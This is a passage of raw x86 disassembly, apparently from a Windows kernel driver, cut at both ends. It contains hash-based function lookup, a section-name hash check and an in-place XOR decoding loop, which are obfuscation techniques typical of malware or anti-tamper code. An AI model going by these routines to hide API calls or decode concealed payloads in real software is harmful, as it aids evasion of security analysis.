   1246e:	3b c1                	cmp    %ecx,%eax
   12470:	75 19                	jne    0x1248b
   12472:	89 02                	mov    %eax,(%edx)
   12474:	8b 4c 24 20          	mov    0x20(%esp),%ecx
   12478:	8d 47 01             	lea    0x1(%edi),%eax
   1247b:	83 c1 f6             	add    $0xfffffff6,%ecx
   1247e:	3b c1                	cmp    %ecx,%eax
   12480:	73 10                	jae    0x12492
   12482:	8b 4c 24 10          	mov    0x10(%esp),%ecx
   12486:	e9 e8 fe ff ff       	jmp    0x12373
   1248b:	8b 44 24 28          	mov    0x28(%esp),%eax
   1248f:	c6 00 01             	movb   $0x1,(%eax)
   12492:	5f                   	pop    %edi
   12493:	5e                   	pop    %esi
   12494:	5d                   	pop    %ebp
   12495:	83 c4 08             	add    $0x8,%esp
   12498:	c2 14 00             	ret    $0x14
   1249b:	cc                   	int3
   1249c:	cc                   	int3
   1249d:	cc                   	int3
   1249e:	cc                   	int3
   1249f:	cc                   	int3
   124a0:	83 ec 2c             	sub    $0x2c,%esp
   124a3:	53                   	push   %ebx
   124a4:	55                   	push   %ebp
   124a5:	56                   	push   %esi
   124a6:	57                   	push   %edi
   124a7:	33 ff                	xor    %edi,%edi
   124a9:	39 3d ec 53 01 00    	cmp    %edi,0x153ec
   124af:	89 3d e8 53 01 00    	mov    %edi,0x153e8
   124b5:	0f 85 d8 00 00 00    	jne    0x12593
   124bb:	e8 f0 07 00 00       	call   0x12cb0
   124c0:	8b d8                	mov    %eax,%ebx
   124c2:	3b df                	cmp    %edi,%ebx
   124c4:	75 17                	jne    0x124dd
   124c6:	c7 05 ec 53 01 00 01 	movl   $0xc0000001,0x153ec
   124cd:	00 00 c0 
   124d0:	b8 e8 53 01 00       	mov    $0x153e8,%eax
   124d5:	5f                   	pop    %edi
   124d6:	5e                   	pop    %esi
   124d7:	5d                   	pop    %ebp
   124d8:	5b                   	pop    %ebx
   124d9:	83 c4 2c             	add    $0x2c,%esp
   124dc:	c3                   	ret
   124dd:	6a 01                	push   $0x1
   124df:	8d 44 24 20          	lea    0x20(%esp),%eax
   124e3:	53                   	push   %ebx
   124e4:	50                   	push   %eax
   124e5:	e8 4c 0a 00 00       	call   0x12f36
   124ea:	83 c4 0c             	add    $0xc,%esp
   124ed:	85 c0                	test   %eax,%eax
   124ef:	75 d5                	jne    0x124c6
   124f1:	66 8b 44 24 34       	mov    0x34(%esp),%ax
   124f6:	66 3b c7             	cmp    %di,%ax
   124f9:	8b 6c 24 30          	mov    0x30(%esp),%ebp
   124fd:	0f b7 c8             	movzwl %ax,%ecx
   12500:	89 4c 24 18          	mov    %ecx,0x18(%esp)
   12504:	89 7c 24 14          	mov    %edi,0x14(%esp)
   12508:	76 bc                	jbe    0x124c6
   1250a:	8d 9b 00 00 00 00    	lea    0x0(%ebx),%ebx
   12510:	0f b7 c7             	movzwl %di,%eax
   12513:	8d 14 80             	lea    (%eax,%eax,4),%edx
   12516:	8b 44 d5 24          	mov    0x24(%ebp,%edx,8),%eax
   1251a:	8d 74 d5 00          	lea    0x0(%ebp,%edx,8),%esi
   1251e:	25 20 00 00 62       	and    $0x62000020,%eax
   12523:	3d 20 00 00 60       	cmp    $0x60000020,%eax
   12528:	75 4e                	jne    0x12578
   1252a:	8b ce                	mov    %esi,%ecx
   1252c:	e8 5f fb ff ff       	call   0x12090
   12531:	3d a8 b9 93 4b       	cmp    $0x4b93b9a8,%eax
   12536:	74 07                	je     0x1253f
   12538:	3d 1c 97 94 12       	cmp    $0x1294971c,%eax
   1253d:	75 39                	jne    0x12578
   1253f:	8b 46 08             	mov    0x8(%esi),%eax
   12542:	8b 4e 10             	mov    0x10(%esi),%ecx
   12545:	3b c1                	cmp    %ecx,%eax
   12547:	73 02                	jae    0x1254b
   12549:	8b c8                	mov    %eax,%ecx
   1254b:	8b 46 0c             	mov    0xc(%esi),%eax
   1254e:	8d 54 24 13          	lea    0x13(%esp),%edx
   12552:	52                   	push   %edx
   12553:	03 c3                	add    %ebx,%eax
   12555:	8d 54 24 18          	lea    0x18(%esp),%edx
   12559:	52                   	push   %edx
   1255a:	03 c8                	add    %eax,%ecx
   1255c:	51                   	push   %ecx
   1255d:	50                   	push   %eax
   1255e:	8d 54 24 2c          	lea    0x2c(%esp),%edx
   12562:	52                   	push   %edx
   12563:	c6 44 24 27 01       	movb   $0x1,0x27(%esp)
   12568:	e8 73 fd ff ff       	call   0x122e0
   1256d:	80 7c 24 13 00       	cmpb   $0x0,0x13(%esp)
   12572:	0f 85 4e ff ff ff    	jne    0x124c6
   12578:	83 c7 01             	add    $0x1,%edi
   1257b:	66 3b 7c 24 18       	cmp    0x18(%esp),%di
   12580:	72 8e                	jb     0x12510
   12582:	8b 44 24 14          	mov    0x14(%esp),%eax
   12586:	85 c0                	test   %eax,%eax
   12588:	0f 84 38 ff ff ff    	je     0x124c6
   1258e:	a3 e8 53 01 00       	mov    %eax,0x153e8
   12593:	5f                   	pop    %edi
   12594:	5e                   	pop    %esi
   12595:	5d                   	pop    %ebp
   12596:	b8 e8 53 01 00       	mov    $0x153e8,%eax
   1259b:	5b                   	pop    %ebx
   1259c:	83 c4 2c             	add    $0x2c,%esp
   1259f:	c3                   	ret
   125a0:	83 ec 20             	sub    $0x20,%esp
   125a3:	56                   	push   %esi
   125a4:	33 f6                	xor    %esi,%esi
   125a6:	89 35 5c 53 01 00    	mov    %esi,0x1535c
   125ac:	89 35 60 53 01 00    	mov    %esi,0x15360
   125b2:	89 35 64 53 01 00    	mov    %esi,0x15364
   125b8:	89 35 68 53 01 00    	mov    %esi,0x15368
   125be:	89 35 6c 53 01 00    	mov    %esi,0x1536c
   125c4:	89 35 70 53 01 00    	mov    %esi,0x15370
   125ca:	89 35 74 53 01 00    	mov    %esi,0x15374
   125d0:	89 35 78 53 01 00    	mov    %esi,0x15378
   125d6:	e8 d5 06 00 00       	call   0x12cb0
   125db:	3b c6                	cmp    %esi,%eax
   125dd:	0f 84 e3 00 00 00    	je     0x126c6
   125e3:	6a 01                	push   $0x1
   125e5:	50                   	push   %eax
   125e6:	8d 44 24 0c          	lea    0xc(%esp),%eax
   125ea:	50                   	push   %eax
   125eb:	e8 46 09 00 00       	call   0x12f36
   125f0:	83 c4 0c             	add    $0xc,%esp
   125f3:	85 c0                	test   %eax,%eax
   125f5:	0f 85 cb 00 00 00    	jne    0x126c6
   125fb:	8d 4c 24 04          	lea    0x4(%esp),%ecx
   125ff:	68 4d 39 67 aa       	push   $0xaa67394d
   12604:	51                   	push   %ecx
   12605:	e8 b6 0a 00 00       	call   0x130c0
   1260a:	8d 54 24 0c          	lea    0xc(%esp),%edx
   1260e:	68 39 93 fd 6d       	push   $0x6dfd9339
   12613:	52                   	push   %edx
   12614:	a3 6c 53 01 00       	mov    %eax,0x1536c
   12619:	e8 a2 0a 00 00       	call   0x130c0
   1261e:	a3 70 53 01 00       	mov    %eax,0x15370
   12623:	8d 44 24 14          	lea    0x14(%esp),%eax
   12627:	68 fd 06 13 a8       	push   $0xa81306fd
   1262c:	50                   	push   %eax
   1262d:	e8 8e 0a 00 00       	call   0x130c0
   12632:	8d 4c 24 1c          	lea    0x1c(%esp),%ecx
   12636:	68 55 87 fe 7a       	push   $0x7afe8755
   1263b:	51                   	push   %ecx
   1263c:	a3 74 53 01 00       	mov    %eax,0x15374
   12641:	e8 7a 0a 00 00       	call   0x130c0
   12646:	83 c4 20             	add    $0x20,%esp
   12649:	39 35 6c 53 01 00    	cmp    %esi,0x1536c
   1264f:	a3 78 53 01 00       	mov    %eax,0x15378
   12654:	74 70                	je     0x126c6
   12656:	39 35 70 53 01 00    	cmp    %esi,0x15370
   1265c:	74 68                	je     0x126c6
   1265e:	39 35 74 53 01 00    	cmp    %esi,0x15374
   12664:	74 60                	je     0x126c6
   12666:	3b c6                	cmp    %esi,%eax
   12668:	74 5c                	je     0x126c6
   1266a:	e8 71 06 00 00       	call   0x12ce0
   1266f:	84 c0                	test   %al,%al
   12671:	75 53                	jne    0x126c6
   12673:	8d 54 24 04          	lea    0x4(%esp),%edx
   12677:	68 b8 f8 5e ca       	push   $0xca5ef8b8
   1267c:	52                   	push   %edx
   1267d:	e8 3e 0a 00 00       	call   0x130c0
   12682:	a3 5c 53 01 00       	mov    %eax,0x1535c
   12687:	8d 44 24 0c          	lea    0xc(%esp),%eax
   1268b:	68 b0 c9 8d b0       	push   $0xb08dc9b0
   12690:	50                   	push   %eax
   12691:	e8 2a 0a 00 00       	call   0x130c0
   12696:	8d 4c 24 14          	lea    0x14(%esp),%ecx
   1269a:	68 fc 99 53 88       	push   $0x885399fc
   1269f:	51                   	push   %ecx
   126a0:	a3 60 53 01 00       	mov    %eax,0x15360
   126a5:	e8 16 0a 00 00       	call   0x130c0
   126aa:	8d 54 24 1c          	lea    0x1c(%esp),%edx
   126ae:	68 3c 95 68 5a       	push   $0x5a68953c
   126b3:	52                   	push   %edx
   126b4:	a3 64 53 01 00       	mov    %eax,0x15364
   126b9:	e8 02 0a 00 00       	call   0x130c0
   126be:	83 c4 20             	add    $0x20,%esp
   126c1:	a3 68 53 01 00       	mov    %eax,0x15368
   126c6:	b8 5c 53 01 00       	mov    $0x1535c,%eax
   126cb:	5e                   	pop    %esi
   126cc:	83 c4 20             	add    $0x20,%esp
   126cf:	c3                   	ret
   126d0:	51                   	push   %ecx
   126d1:	55                   	push   %ebp
   126d2:	8b 6c 24 0c          	mov    0xc(%esp),%ebp
   126d6:	8b 45 60             	mov    0x60(%ebp),%eax
   126d9:	33 d2                	xor    %edx,%edx
   126db:	b9 28 00 00 00       	mov    $0x28,%ecx
   126e0:	89 55 1c             	mov    %edx,0x1c(%ebp)
   126e3:	39 48 08             	cmp    %ecx,0x8(%eax)
   126e6:	74 0a                	je     0x126f2
   126e8:	b8 0d 00 00 c0       	mov    $0xc000000d,%eax
   126ed:	5d                   	pop    %ebp
   126ee:	59                   	pop    %ecx
   126ef:	c2 04 00             	ret    $0x4
   126f2:	39 48 04             	cmp    %ecx,0x4(%eax)
   126f5:	75 f1                	jne    0x126e8
   126f7:	53                   	push   %ebx
   126f8:	8b 5d 0c             	mov    0xc(%ebp),%ebx
   126fb:	81 3b 0d f0 ab af    	cmpl   $0xafabf00d,(%ebx)
   12701:	74 0b                	je     0x1270e
   12703:	5b                   	pop    %ebx
   12704:	b8 0d 00 00 c0       	mov    $0xc000000d,%eax
   12709:	5d                   	pop    %ebp
   1270a:	59                   	pop    %ecx
   1270b:	c2 04 00             	ret    $0x4
   1270e:	56                   	push   %esi
   1270f:	57                   	push   %edi
   12710:	8d 7c 24 18          	lea    0x18(%esp),%edi
   12714:	8d 74 24 10          	lea    0x10(%esp),%esi
   12718:	89 54 24 18          	mov    %edx,0x18(%esp)
   1271c:	e8 1f e3 ff ff       	call   0x10a40
   12721:	8b 44 24 18          	mov    0x18(%esp),%eax
   12725:	85 c0                	test   %eax,%eax
   12727:	5f                   	pop    %edi
   12728:	5e                   	pop    %esi
   12729:	75 26                	jne    0x12751
   1272b:	8d 43 20             	lea    0x20(%ebx),%eax
   1272e:	50                   	push   %eax
   1272f:	8b 00                	mov    (%eax),%eax
   12731:	50                   	push   %eax
   12732:	8b 43 08             	mov    0x8(%ebx),%eax
   12735:	8d 4b 18             	lea    0x18(%ebx),%ecx
   12738:	51                   	push   %ecx
   12739:	8b 4c 24 14          	mov    0x14(%esp),%ecx
   1273d:	8d 53 10             	lea    0x10(%ebx),%edx
   12740:	52                   	push   %edx
   12741:	8b 11                	mov    (%ecx),%edx
   12743:	50                   	push   %eax
   12744:	ff d2                	call   *%edx
   12746:	85 c0                	test   %eax,%eax
   12748:	75 07                	jne    0x12751
   1274a:	c7 45 1c 28 00 00 00 	movl   $0x28,0x1c(%ebp)
   12751:	5b                   	pop    %ebx
   12752:	5d                   	pop    %ebp
   12753:	59                   	pop    %ecx
   12754:	c2 04 00             	ret    $0x4
   12757:	cc                   	int3
   12758:	cc                   	int3
   12759:	cc                   	int3
   1275a:	cc                   	int3
   1275b:	cc                   	int3
   1275c:	cc                   	int3
   1275d:	cc                   	int3
   1275e:	cc                   	int3
   1275f:	cc                   	int3
   12760:	83 ec 24             	sub    $0x24,%esp
   12763:	53                   	push   %ebx
   12764:	56                   	push   %esi
   12765:	8d 4c 24 10          	lea    0x10(%esp),%ecx
   12769:	51                   	push   %ecx
   1276a:	33 db                	xor    %ebx,%ebx
   1276c:	68 19 00 02 00       	push   $0x20019
   12771:	8d 54 24 14          	lea    0x14(%esp),%edx
   12775:	52                   	push   %edx
   12776:	88 5c 24 14          	mov    %bl,0x14(%esp)
   1277a:	89 5c 24 18          	mov    %ebx,0x18(%esp)
   1277e:	c7 44 24 1c 18 00 00 	movl   $0x18,0x1c(%esp)
   12785:	00 
   12786:	89 5c 24 20          	mov    %ebx,0x20(%esp)
   1278a:	c7 44 24 28 40 00 00 	movl   $0x40,0x28(%esp)
   12791:	00 
   12792:	89 44 24 24          	mov    %eax,0x24(%esp)
   12796:	89 5c 24 2c          	mov    %ebx,0x2c(%esp)
   1279a:	89 5c 24 30          	mov    %ebx,0x30(%esp)
   1279e:	ff 15 18 34 01 00    	call   *0x13418
   127a4:	8b f0                	mov    %eax,%esi
   127a6:	3b f3                	cmp    %ebx,%esi
   127a8:	0f 94 c0             	sete   %al
   127ab:	3b f3                	cmp    %ebx,%esi
   127ad:	88 44 24 08          	mov    %al,0x8(%esp)
   127b1:	74 1d                	je     0x127d0
   127b3:	3a c3                	cmp    %bl,%al
   127b5:	74 42                	je     0x127f9
   127b7:	8b 44 24 0c          	mov    0xc(%esp),%eax
   127bb:	50                   	push   %eax
   127bc:	88 5c 24 0c          	mov    %bl,0xc(%esp)
   127c0:	ff 15 c4 33 01 00    	call   *0x133c4
   127c6:	8b c6                	mov    %esi,%eax
   127c8:	5e                   	pop    %esi
   127c9:	5b                   	pop    %ebx
   127ca:	83 c4 24             	add    $0x24,%esp
   127cd:	c2 08 00             	ret    $0x8
   127d0:	8b 4c 24 34          	mov    0x34(%esp),%ecx
   127d4:	8b 44 24 30          	mov    0x30(%esp),%eax
   127d8:	51                   	push   %ecx
   127d9:	8d 4c 24 0c          	lea    0xc(%esp),%ecx
   127dd:	e8 2e 00 00 00       	call   0x12810
   127e2:	38 5c 24 08          	cmp    %bl,0x8(%esp)
   127e6:	8b f0                	mov    %eax,%esi
   127e8:	74 0f                	je     0x127f9
   127ea:	8b 54 24 0c          	mov    0xc(%esp),%edx
   127ee:	52                   	push   %edx
   127ef:	88 5c 24 0c          	mov    %bl,0xc(%esp)
   127f3:	ff 15 c4 33 01 00    	call   *0x133c4
   127f9:	8b c6                	mov    %esi,%eax
   127fb:	5e                   	pop    %esi
   127fc:	5b                   	pop    %ebx
   127fd:	83 c4 24             	add    $0x24,%esp
   12800:	c2 08 00             	ret    $0x8
   12803:	cc                   	int3
   12804:	cc                   	int3
   12805:	cc                   	int3
   12806:	cc                   	int3
   12807:	cc                   	int3
   12808:	cc                   	int3
   12809:	cc                   	int3
   1280a:	cc                   	int3
   1280b:	cc                   	int3
   1280c:	cc                   	int3
   1280d:	cc                   	int3
   1280e:	cc                   	int3
   1280f:	cc                   	int3
   12810:	83 ec 08             	sub    $0x8,%esp
   12813:	53                   	push   %ebx
   12814:	55                   	push   %ebp
   12815:	56                   	push   %esi
   12816:	8b f1                	mov    %ecx,%esi
   12818:	80 3e 00             	cmpb   $0x0,(%esi)
   1281b:	57                   	push   %edi
   1281c:	8b d8                	mov    %eax,%ebx
   1281e:	74 7c                	je     0x1289c
   12820:	8b 4e 04             	mov    0x4(%esi),%ecx
   12823:	8b 3d 14 34 01 00    	mov    0x13414,%edi
   12829:	8d 44 24 10          	lea    0x10(%esp),%eax
   1282d:	50                   	push   %eax
   1282e:	6a 00                	push   $0x0
   12830:	6a 00                	push   $0x0
   12832:	6a 02                	push   $0x2
   12834:	53                   	push   %ebx
   12835:	51                   	push   %ecx
   12836:	c7 44 24 28 00 00 00 	movl   $0x0,0x28(%esp)
   1283d:	00 
   1283e:	ff d7                	call   *%edi
   12840:	3d 23 00 00 c0       	cmp    $0xc0000023,%eax
   12845:	75 55                	jne    0x1289c
   12847:	8b 54 24 10          	mov    0x10(%esp),%edx
   1284b:	52                   	push   %edx
   1284c:	6a 00                	push   $0x0
   1284e:	ff 15 a0 33 01 00    	call   *0x133a0
   12854:	8b e8                	mov    %eax,%ebp
   12856:	85 ed                	test   %ebp,%ebp
   12858:	74 42                	je     0x1289c
   1285a:	8b 4c 24 10          	mov    0x10(%esp),%ecx
   1285e:	8b 56 04             	mov    0x4(%esi),%edx
   12861:	8d 44 24 10          	lea    0x10(%esp),%eax
   12865:	50                   	push   %eax
   12866:	51                   	push   %ecx
   12867:	55                   	push   %ebp
   12868:	6a 02                	push   $0x2
   1286a:	53                   	push   %ebx
   1286b:	52                   	push   %edx
   1286c:	ff d7                	call   *%edi
   1286e:	8b f8                	mov    %eax,%edi
   12870:	85 ff                	test   %edi,%edi
   12872:	89 7c 24 14          	mov    %edi,0x14(%esp)
   12876:	74 15                	je     0x1288d
   12878:	6a 00                	push   $0x0
   1287a:	55                   	push   %ebp
   1287b:	ff 15 f8 33 01 00    	call   *0x133f8
   12881:	8b c7                	mov    %edi,%eax
   12883:	5f                   	pop    %edi
   12884:	5e                   	pop    %esi
   12885:	5d                   	pop    %ebp
   12886:	5b                   	pop    %ebx
   12887:	83 c4 08             	add    $0x8,%esp
   1288a:	c2 04 00             	ret    $0x4
   1288d:	83 7d 04 03          	cmpl   $0x3,0x4(%ebp)
   12891:	74 18                	je     0x128ab
   12893:	6a 00                	push   $0x0
   12895:	55                   	push   %ebp
   12896:	ff 15 f8 33 01 00    	call   *0x133f8
   1289c:	b8 01 00 00 c0       	mov    $0xc0000001,%eax
   128a1:	5f                   	pop    %edi
   128a2:	5e                   	pop    %esi
   128a3:	5d                   	pop    %ebp
   128a4:	5b                   	pop    %ebx
   128a5:	83 c4 08             	add    $0x8,%esp
   128a8:	c2 04 00             	ret    $0x4
   128ab:	6a 10                	push   $0x10
   128ad:	6a 00                	push   $0x0
   128af:	ff 15 a0 33 01 00    	call   *0x133a0
   128b5:	85 c0                	test   %eax,%eax
   128b7:	74 18                	je     0x128d1
   128b9:	8b 7d 08             	mov    0x8(%ebp),%edi
   128bc:	8d 4d 0c             	lea    0xc(%ebp),%ecx
   128bf:	51                   	push   %ecx
   128c0:	8d 5c 24 18          	lea    0x18(%esp),%ebx
   128c4:	8b f0                	mov    %eax,%esi
   128c6:	e8 c5 dd ff ff       	call   0x10690
   128cb:	8b 7c 24 14          	mov    0x14(%esp),%edi
   128cf:	eb 02                	jmp    0x128d3
   128d1:	33 c0                	xor    %eax,%eax
   128d3:	8b 74 24 1c          	mov    0x1c(%esp),%esi
   128d7:	56                   	push   %esi
   128d8:	8b d8                	mov    %eax,%ebx
   128da:	e8 c1 e0 ff ff       	call   0x109a0
   128df:	85 ff                	test   %edi,%edi
   128e1:	75 95                	jne    0x12878
   128e3:	39 7e 04             	cmp    %edi,0x4(%esi)
   128e6:	57                   	push   %edi
   128e7:	55                   	push   %ebp
   128e8:	74 ac                	je     0x12896
   128ea:	ff 15 f8 33 01 00    	call   *0x133f8
   128f0:	5f                   	pop    %edi
   128f1:	5e                   	pop    %esi
   128f2:	5d                   	pop    %ebp
   128f3:	33 c0                	xor    %eax,%eax
   128f5:	5b                   	pop    %ebx
   128f6:	83 c4 08             	add    $0x8,%esp
   128f9:	c2 04 00             	ret    $0x4
   128fc:	cc                   	int3
   128fd:	cc                   	int3
   128fe:	cc                   	int3
   128ff:	cc                   	int3
   12900:	56                   	push   %esi
   12901:	81 f1 f0 40 f6 7e    	xor    $0x7ef640f0,%ecx
   12907:	33 f6                	xor    %esi,%esi
   12909:	85 db                	test   %ebx,%ebx
   1290b:	76 37                	jbe    0x12944
   1290d:	8d 49 00             	lea    0x0(%ecx),%ecx
   12910:	30 0c 3e             	xor    %cl,(%esi,%edi,1)
   12913:	8b c1                	mov    %ecx,%eax
   12915:	83 e0 fb             	and    $0xfffffffb,%eax
   12918:	c1 e0 1c             	shl    $0x1c,%eax
   1291b:	c1 e9 05             	shr    $0x5,%ecx
   1291e:	0b c8                	or     %eax,%ecx
   12920:	8b d1                	mov    %ecx,%edx
   12922:	0f af d1             	imul   %ecx,%edx
   12925:	b8 d3 91 d8 79       	mov    $0x79d891d3,%eax
   1292a:	f7 e2                	mul    %edx
   1292c:	8b c1                	mov    %ecx,%eax
   1292e:	69 c0 6a 95 7c 78    	imul   $0x787c956a,%eax,%eax
   12934:	c1 ea 0e             	shr    $0xe,%edx
   12937:	8d 54 02 01          	lea    0x1(%edx,%eax,1),%edx
   1293b:	83 c6 01             	add    $0x1,%esi
   1293e:	33 ca                	xor    %edx,%ecx
   12940:	3b f3                	cmp    %ebx,%esi
   12942:	72 cc                	jb     0x12910
   12944:	5e                   	pop    %esi
   12945:	c3                   	ret
   12946:	cc                   	int3
   12947:	cc                   	int3
   12948:	cc                   	int3
   12949:	cc                   	int3
   1294a:	cc                   	int3
   1294b:	cc                   	int3
   1294c:	cc                   	int3
   1294d:	cc                   	int3
   1294e:	cc                   	int3
   1294f:	cc                   	int3
   12950:	55                   	push   %ebp
   12951:	8b ec                	mov    %esp,%ebp
   12953:	6a ff                	push   $0xffffffff
   12955:	68 98 50 01 00       	push   $0x15098
   1295a:	68 6a 31 01 00       	push   $0x1316a
   1295f:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
   12965:	50                   	push   %eax
   12966:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
   1296d:	83 ec 24             	sub    $0x24,%esp
   12970:	53                   	push   %ebx
   12971:	56                   	push   %esi
   12972:	57                   	push   %edi
   12973:	89 65 e8             	mov    %esp,-0x18(%ebp)
   12976:	8b 7d 0c             	mov    0xc(%ebp),%edi
   12979:	8b 75 08             	mov    0x8(%ebp),%esi
   1297c:	c7 06 00 00 00 00    	movl   $0x0,(%esi)
   12982:	c6 46 04 01          	movb   $0x1,0x4(%esi)
   12986:	83 3f 00             	cmpl   $0x0,(%edi)
   12989:	75 65                	jne    0x129f0
   1298b:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
   12992:	8d 45 d0             	lea    -0x30(%ebp),%eax
   12995:	50                   	push   %eax
   12996:	e8 e5 03 00 00       	call   0x12d80
   1299b:	89 07                	mov    %eax,(%edi)
   1299d:	85 c0                	test   %eax,%eax
   1299f:	75 2a                	jne    0x129cb
   129a1:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
   129a4:	85 c9                	test   %ecx,%ecx
   129a6:	75 0f                	jne    0x129b7
   129a8:	c7 07 01 00 00 c0    	movl   $0xc0000001,(%edi)
   129ae:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
   129b5:	eb 39                	jmp    0x129f0
   129b7:	8b 41 08             	mov    0x8(%ecx),%eax
   129ba:	85 c0                	test   %eax,%eax
   129bc:	74 ea                	je     0x129a8
   129be:	89 06                	mov    %eax,(%esi)
   129c0:	33 d2                	xor    %edx,%edx
   129c2:	38 51 02             	cmp    %dl,0x2(%ecx)
   129c5:	0f 95 c2             	setne  %dl
   129c8:	88 56 04             	mov    %dl,0x4(%esi)
   129cb:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
   129d2:	eb 1c                	jmp    0x129f0
   129d4:	b8 01 00 00 00       	mov    $0x1,%eax
   129d9:	c3                   	ret
   129da:	8b 65 e8             	mov    -0x18(%ebp),%esp
   129dd:	8b 45 0c             	mov    0xc(%ebp),%eax
   129e0:	c7 00 01 00 00 c0    	movl   $0xc0000001,(%eax)
   129e6:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
   129ed:	8b 75 08             	mov    0x8(%ebp),%esi
   129f0:	8b c6                	mov    %esi,%eax
   129f2:	8b 4d f0             	mov    -0x10(%ebp),%ecx
   129f5:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
   129fc:	5f                   	pop    %edi
   129fd:	5e                   	pop    %esi
   129fe:	5b                   	pop    %ebx
   129ff:	8b e5                	mov    %ebp,%esp
   12a01:	5d                   	pop    %ebp
   12a02:	c2 08 00             	ret    $0x8
   12a05:	cc                   	int3
   12a06:	cc                   	int3
   12a07:	cc                   	int3
   12a08:	cc                   	int3
   12a09:	cc                   	int3
   12a0a:	cc                   	int3
   12a0b:	cc                   	int3
   12a0c:	cc                   	int3
   12a0d:	cc                   	int3
   12a0e:	cc                   	int3
   12a0f:	cc                   	int3
   12a10:	81 ec 2c 01 00 00    	sub    $0x12c,%esp
   12a16:	53                   	push   %ebx
   12a17:	55                   	push   %ebp
   12a18:	8b ac 24 38 01 00 00 	mov    0x138(%esp),%ebp
   12a1f:	56                   	push   %esi
   12a20:	c6 45 00 01          	movb   $0x1,0x0(%ebp)
   12a24:	ff 15 84 33 01 00    	call   *0x13384
   12a2a:	84 c0                	test   %al,%al
   12a2c:	74 12                	je     0x12a40
   12a2e:	c6 45 00 00          	movb   $0x0,0x0(%ebp)
   12a32:	33 c0                	xor    %eax,%eax
   12a34:	5e                   	pop    %esi
   12a35:	5d                   	pop    %ebp
   12a36:	5b                   	pop    %ebx
   12a37:	81 c4 2c 01 00 00    	add    $0x12c,%esp
   12a3d:	c2 04 00             	ret    $0x4
   12a40:	8d 74 24 14          	lea    0x14(%esp),%esi
   12a44:	e8 d7 e1 ff ff       	call   0x10c20
   12a49:	8b 35 24 34 01 00    	mov    0x13424,%esi
   12a4f:	33 db                	xor    %ebx,%ebx
   12a51:	53                   	push   %ebx
   12a52:	53                   	push   %ebx
   12a53:	8d 44 24 14          	lea    0x14(%esp),%eax
   12a57:	50                   	push   %eax
   12a58:	8d 4c 24 1c          	lea    0x1c(%esp),%ecx
   12a5c:	51                   	push   %ecx
   12a5d:	89 5c 24 20          	mov    %ebx,0x20(%esp)
   12a61:	89 5c 24 1c          	mov    %ebx,0x1c(%esp)
   12a65:	ff d6                	call   *%esi
   12a67:	83 7c 24 10 05       	cmpl   $0x5,0x10(%esp)
   12a6c:	75 0a                	jne    0x12a78
   12a6e:	39 5c 24 0c          	cmp    %ebx,0xc(%esp)
   12a72:	0f 84 a8 00 00 00    	je     0x12b20
   12a78:	53                   	push   %ebx
   12a79:	53                   	push   %ebx
   12a7a:	8d 54 24 18          	lea    0x18(%esp),%edx
   12a7e:	52                   	push   %edx
   12a7f:	8d 44 24 18          	lea    0x18(%esp),%eax
   12a83:	50                   	push   %eax
   12a84:	89 5c 24 1c          	mov    %ebx,0x1c(%esp)
   12a88:	89 5c 24 20          	mov    %ebx,0x20(%esp)
   12a8c:	ff d6                	call   *%esi
   12a8e:	83 7c 24 0c 05       	cmpl   $0x5,0xc(%esp)
   12a93:	75 0b                	jne    0x12aa0
   12a95:	83 7c 24 10 01       	cmpl   $0x1,0x10(%esp)
   12a9a:	0f 84 80 00 00 00    	je     0x12b20
   12aa0:	e8 8b 02 00 00       	call   0x12d30
   12aa5:	84 c0                	test   %al,%al
   12aa7:	8b 74 24 14          	mov    0x14(%esp),%esi
   12aab:	74 63                	je     0x12b10
   12aad:	68 1c 01 00 00       	push   $0x11c
   12ab2:	8d 4c 24 1c          	lea    0x1c(%esp),%ecx
   12ab6:	68 ff 00 00 00       	push   $0xff
   12abb:	51                   	push   %ecx
   12abc:	e8 af 06 00 00       	call   0x13170
   12ac1:	c7 44 24 24 1c 01 00 	movl   $0x11c,0x24(%esp)
   12ac8:	00 
   12ac9:	8b 06                	mov    (%esi),%eax
   12acb:	83 c4 0c             	add    $0xc,%esp
   12ace:	3b c3                	cmp    %ebx,%eax
   12ad0:	75 11                	jne    0x12ae3
   12ad2:	b8 01 00 00 c0       	mov    $0xc0000001,%eax
   12ad7:	5e                   	pop    %esi
   12ad8:	5d                   	pop    %ebp
   12ad9:	5b                   	pop    %ebx
   12ada:	81 c4 2c 01 00 00    	add    $0x12c,%esp
   12ae0:	c2 04 00             	ret    $0x4
   12ae3:	8d 54 24 18          	lea    0x18(%esp),%edx
   12ae7:	52                   	push   %edx
   12ae8:	ff d0                	call   *%eax
   12aea:	3b c3                	cmp    %ebx,%eax
   12aec:	75 34                	jne    0x12b22
   12aee:	66 39 9c 24 2c 01 00 	cmp    %bx,0x12c(%esp)
   12af5:	00 
   12af6:	75 18                	jne    0x12b10
   12af8:	8b 46 04             	mov    0x4(%esi),%eax
   12afb:	f7 d8                	neg    %eax
   12afd:	1b c0                	sbb    %eax,%eax
   12aff:	25 01 00 00 c0       	and    $0xc0000001,%eax
   12b04:	5e                   	pop    %esi
   12b05:	5d                   	pop    %ebp
   12b06:	5b                   	pop    %ebx
   12b07:	81 c4 2c 01 00 00    	add    $0x12c,%esp
   12b0d:	c2 04 00             	ret    $0x4
   12b10:	8b 46 04             	mov    0x4(%esi),%eax
   12b13:	3b c3                	cmp    %ebx,%eax
   12b15:	74 bb                	je     0x12ad2
   12b17:	ff d0                	call   *%eax
   12b19:	84 c0                	test   %al,%al
   12b1b:	74 03                	je     0x12b20
   12b1d:	88 5d 00             	mov    %bl,0x0(%ebp)
   12b20:	33 c0                	xor    %eax,%eax
   12b22:	5e                   	pop    %esi
   12b23:	5d                   	pop    %ebp
   12b24:	5b                   	pop    %ebx
   12b25:	81 c4 2c 01 00 00    	add    $0x12c,%esp
   12b2b:	c2 04 00             	ret    $0x4
   12b2e:	cc                   	int3
   12b2f:	cc                   	int3
   12b30:	51                   	push   %ecx
   12b31:	55                   	push   %ebp
   12b32:	8b 6c 24 0c          	mov    0xc(%esp),%ebp
   12b36:	83 7d 00 00          	cmpl   $0x0,0x0(%ebp)
   12b3a:	56                   	push   %esi
   12b3b:	c6 03 00             	movb   $0x0,(%ebx)
